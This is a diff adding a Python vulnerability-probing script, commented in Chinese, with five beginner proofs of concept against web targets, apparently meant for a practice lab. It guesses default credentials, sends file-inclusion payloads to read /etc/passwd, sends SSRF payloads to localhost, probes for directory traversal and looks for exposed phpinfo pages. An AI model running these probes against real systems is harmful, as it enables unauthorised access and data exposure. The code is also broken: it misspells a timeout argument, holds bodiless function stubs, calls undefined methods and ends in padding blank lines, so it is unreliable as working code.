@@ -1,0 +1,218 @@
+import requests
+import re
+
+from sympy.codegen.ast import continue_
+
+
+#五个入门级POC
+#1弱口令检测
+def poc_weak_pass(url):
+    """弱口令POC:尝试常见账号密码组合"""
+    pass_list = [("admin","admin"),("admin","123456"),("test","test")]
+    #假设靶场登录接口是/login.php,POST提交
+    login_url = f"{url}/login.php" if not url.endswith("/") else f"{url}login.php"
+    for user,pwd in pass_list:
+        try:
+            data = {"username":user,"password":pwd,"submit":"登录"}
+            resp = requests.post(login_url,data=data,verify=False,timeout=5)
+            #登录成功特征
+            if "欢迎" in resp.text or "后台" in resp.text or "dashboard" in resp.text:
+                return f"[弱口令]{login_url} | 账号:{user} 密码:{pwd}"
+        except:
+            continue
+    return None
+
+
+#2文件包含漏洞
+def poc_lfi(url):
+    """文件包含POC:读取/etc/passwd"""
+    payloads = [
+      "?file=../../etc/passwd",
+      "?file=../../../../Windows/win.ini"
+    ]
+    for payload in payloads:
+        test_url = url + payload
+        try:
+            resp = requests.get(test_url,verify=False,timeout=5)
+            #匹配特征
+            if "root:x" in resp.text or "[fonts]" in resp.text:
+                return f"[文件包含]{test_url}"
+        except:
+            continue
+    return None
+
+#3SSRF漏洞
+def poc_ssrf(url):
+    """SSRF POC:访问内网127.0.0.1:80"""
+    payloads = [
+        "?url=http://127.0.0.1",
+        "?redirect=http://127.0.0.1:8080"
+    ]
+    for payload in payloads:
+        test_url = url + payload
+        try:
+            resp = requests.get(test_url,verify=False,timeote=5)
+            #特征
+            if re.search(r"Apache|Nginex|Tomcat|localhost",resp.text):
+                return f"[SSRF{test_url}]"
+        except:
+            continue
+    return None
+
+#4目录遍历漏洞
+def poc_dir_traversal(url):
+    """目录遍历POC"""
+    payloads = ["?path=../","?file=../../","?dir=../"]
+    for payload in payloads:
+        test_url = url + payload
+        try:
+            resp = requests.get(test_url,verify=False,timeout=5)
+            #特征
+            if re.search(r"<a href=.*?>|index\.php|css/|js/",resp.text):
+                return f"[目录遍历]{test_url}"
+        except:
+            continue
+    return None
+
+#5PHPinfo泄露
+def poc_phpinfo(url):
+    """PHPinfo泄露POC"""
+    test_urls = [
+        url + "/phpinfo.php",
+        url + "/info.php",
+        url + "/phpinfo.php?a=1"
+    ]
+    for test_url in test_urls:
+        try:
+            resp = requests.get(test_url,verify=False,timeout=5)
+            #特征
+            if "PHP Version" in resp.text:
+                return f"[PHPinfo泄露]{test_url}"
+        except:
+            continue
+    return None
+
+#1添加POC函数
+def poc_weak_pass(self,url):
+def poc_lfi(self,url):
+
+#2在scan_worker中追加
+poc_list = [
+    self.poc_sql_bool(target),
+    self.poc_sql_time(target),
+    self.poc_xss_reflect(target),
+    self.poc_cmd_injection(target),
+    self.poc_weak_pass(target),  # 新增
+    self.poc_lfi(target)  # 新增
+]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
